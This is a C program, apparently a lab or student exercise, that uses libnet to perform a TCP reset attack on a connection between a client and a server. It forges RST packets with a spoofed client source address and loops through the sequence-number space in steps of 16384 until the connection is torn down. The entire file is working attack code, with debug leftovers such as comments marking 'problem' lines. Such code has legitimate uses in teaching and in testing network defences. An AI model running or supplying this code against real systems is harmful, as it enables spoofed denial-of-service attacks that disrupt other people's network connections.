#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>

/*
 * Must execute as root
 * Execute as follows: ./reset  client_address client_port server_address server_port
 *
 */


int main(int argc, char **argv)
{
  char *srv_addr;
  char *srv_port;
  char *cli_addr;
  char *cli_port;
  
  libnet_t *attack;
  u_int32_t srv_ip_addr, cli_ip_addr, seq_num;
  libnet_ptag_t ip_tag, tcp_tag;
  char *error_msg = "Error";

  if(argc >= 2) {
      cli_addr = argv[1];
  } else {
      cli_addr = "127.0.0.1";
  }
    
  if(argc >= 3) {
      cli_port = argv[2];
  } else {
      cli_port = "10001";
  }
  
  if (argc >= 4) {
      srv_addr = argv[3];
  } else {
      srv_addr = "127.0.0.1";
  }
  
  if (argc >= 5) {
      srv_port = argv[4];
  }
  else {
      srv_port = "9999";
  }
 
 seq_num = 1200000000;
 ip_tag=0;
 tcp_tag=0;
 attack = libnet_init(LIBNET_RAW4, srv_addr, error_msg); 	// 2nd parameter device may have to be changed
 
 srv_ip_addr = libnet_name2addr4(attack, srv_addr, LIBNET_DONT_RESOLVE);
 cli_ip_addr = libnet_name2addr4(attack, cli_addr, LIBNET_DONT_RESOLVE);

 //atoi(cli_port);
 //atoi(srv_port);

 libnet_build_tcp( atoi(cli_port),    /* src port */			//problem
                   atoi(srv_port),    /* destination port */		//problem
                  seq_num,    /* sequence number */
                  0,    /* acknowledgement */
                  TH_RST,    /* control flags */
                  7,    /* window */
                  0,    /* checksum - 0 = autofill */
                  0,    /* urgent */
                  LIBNET_TCP_H,    /* header length */
                  NULL,    /* payload */
                  0,    /* payload length */
                  attack,    /* libnet context */
                  tcp_tag);    /* protocol tag */
 
 libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H,    /* length */
                0,    /* TOS */
                libnet_get_prand (LIBNET_PRu16),    /* IP ID */
                0,    /* frag offset */
                127,    /* TTL */
                IPPROTO_TCP,    /* upper layer protocol */
                0,    /* checksum, 0=autofill */
                cli_ip_addr,    /* src IP */
                srv_ip_addr,    /* dest IP */
                NULL,    /* payload */
                0,    /* payload len */
                attack,    /* libnet context */
                ip_tag);    /* protocol tag */

 printf("starting reset attack on TCP connection: client %s:%s, server %s:%s\n",
		  cli_addr, cli_port, srv_addr, srv_port);
 printf("Libnet value: %d: %u\nServer Port: %s\nClient Port: %s", libnet_write(attack), seq_num, srv_port, cli_port);

 //libnet_write(attack)
 libnet_destroy(attack);
 
 for(seq_num = (1200000000-16384); seq_num>0; seq_num=(seq_num-16384))
  {
   attack = libnet_init(LIBNET_RAW4, srv_addr, error_msg); 	// 2nd parameter device may have to be changed
 
   libnet_build_tcp(atoi(cli_port), atoi(srv_port), seq_num,
                    0, TH_RST, 7,0, 0, LIBNET_TCP_H,  NULL,  0, attack, tcp_tag);
   libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, libnet_get_prand (LIBNET_PRu16), 0, 127, IPPROTO_TCP,  
 	        0, cli_ip_addr, srv_ip_addr, NULL, 0, attack, ip_tag);

   //libnet_write(attack);
   //printf("Libnet value: %d: %d\n", libnet_write(attack), seq_num);
   libnet_write(attack);
   libnet_destroy(attack);
   	
  }

 printf("Test3");		//attack successful
 //libnet_destroy(attack);
 return 0; 
}

